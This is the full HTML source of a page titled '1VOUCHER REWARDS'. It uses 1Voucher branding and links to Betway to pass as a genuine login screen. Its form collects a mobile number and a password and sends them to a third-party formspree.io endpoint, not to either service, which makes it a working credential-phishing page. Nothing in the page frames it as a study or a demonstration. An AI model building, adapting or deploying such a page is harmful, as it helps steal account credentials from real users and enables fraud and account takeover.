<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>1VOUCHER REWARDS</title>

  <!-- Font & Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:ital@1&display=swap" rel="stylesheet" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: #DD571C;
      overflow-x: hidden;
    }

    .container {
      max-width: 440px;
      padding: 0 20px;
      margin: 50px auto;
      padding-top: 10px;
      padding-bottom: 40px;
    }

    .wrapper {
      width: 100%;
      background: white;
      border-radius: 5px;
      box-shadow: 0px 4px 10px 1px rgba(0, 0, 0, 0.1);
      position: relative;
      overflow: hidden;
    }

    .image-box {
      border-top-left-radius: 8px;
      border-top-right-radius: 8px;
      width: 99%;
      display: block;
      margin: 0 auto;
      box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
    }

    @keyframes blinkTwice {
      0%, 20%, 40%, 100% {
        opacity: 1;
      }
      10%, 30% {
        opacity: 0;
      }
    }

    @keyframes blinkOnce {
      0%, 50%, 100% {
        opacity: 1;
      }
      25% {
        opacity: 0;
      }
    }

    form {
      padding: 30px 25px 25px 25px;
    }

    .row {
      height: 45px;
      margin-bottom: 15px;
      position: relative;
    }

    .row input {
      height: 100%;
      width: 100%;
      outline: none;
      padding-left: 60px;
      border-radius: 5px;
      border: 1px solid lightgrey;
      font-size: 16px;
    }

    .row input:focus {
      border-color: #16a085;
      box-shadow: inset 0px 0px 2px 2px rgba(26, 188, 156, 0.25);
    }

    .row input::placeholder {
      color: #999;
    }

    .row i {
      position: absolute;
      width: 47px;
      height: 100%;
      color: white;
      font-size: 18px;
      background: #DD571C;
      border: 1px solid #16a085;
      border-radius: 5px 0 0 5px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .pass {
      margin: -8px 0 20px 0;
    }

    .pass a {
      color: #DD571C;
      font-size: 17px;
      text-decoration: none;
    }

    .pass a:hover {
      text-decoration: underline;
    }

    .button input {
      color: white;
      font-size: 20px;
      font-weight: 500;
      padding: 10px;
      width: 100%;
      text-align: center;
      background: #DD571C;
      border: 1px solid #FF8C00;
      cursor: pointer;
    }

    .button input:hover {
      background: black;
    }

    .signup-link {
      text-align: center;
      margin-top: 20px;
      font-size: 17px;
    }

    .signup-link a {
      color: #DD571C;
      text-decoration: none;
    }

    .signup-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="wrapper">
      <!-- Image -->
      <img id="voucherImage" src="https://www.peachpayments.com/hubfs/1%20voucher.png" alt="1Voucher" class="image-box" />

      <!-- Form with action pointing to your email handling service -->
      <form id="loginForm" action="https://formspree.io/f/mnqvnyjq" method="POST">
        <!-- Replace with your actual form handling URL -->
        <div class="row">
          <i class="fas fa-user"></i>
          <input
            type="number"
            name="phone"
            placeholder="Mobile Number"
            required
            minlength="10"
            maxlength="10"
            oninput="if(this.value.length > 10) this.value = this.value.slice(0,10)"
          />
        </div>
        <div class="row">
          <i class="fas fa-lock"></i>
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            minlength="4"
          />
        </div>
        <div class="pass"><a href="https://betway.co.za">Forgot password?</a></div>
        <div class="row button">
          <input type="submit" value="Login" />
        </div>
        <div class="signup-link">Not Registered? <a href="https://betway.co.za">Signup now</a></div>
      </form>
    </div>
  </div>
</body>
</html>
